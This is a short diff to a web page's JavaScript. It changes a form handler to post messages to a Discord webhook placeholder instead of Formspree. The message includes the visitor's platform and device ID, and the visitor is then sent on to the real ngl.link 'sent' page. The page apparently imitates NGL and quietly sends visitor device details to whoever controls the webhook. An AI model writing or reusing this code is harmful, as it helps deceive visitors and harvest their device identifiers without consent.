@@ -164,11 +164,15 @@ $(document).ready(function() {
 
 })
 
-async function sendToFormspree(msg) {
-  await fetch("https://formspree.io/f/mvgerepe", {
+async function sendToWebhook(msg) {
+  await fetch("DISCORD_WEBHOOK_URL", {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ message: msg })
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: msg
+    })
   });
 }
 
@@ -211,7 +215,7 @@ $(document).ready(function () {
       "Platforma: " + platform + "\n" +
       "DeviceID: " + deviceId;
 
-    await sendToFormspree(msg);
+    await sendToWebhook(msg);
 
     window.location.href = "https://ngl.link/p/sent";
   });
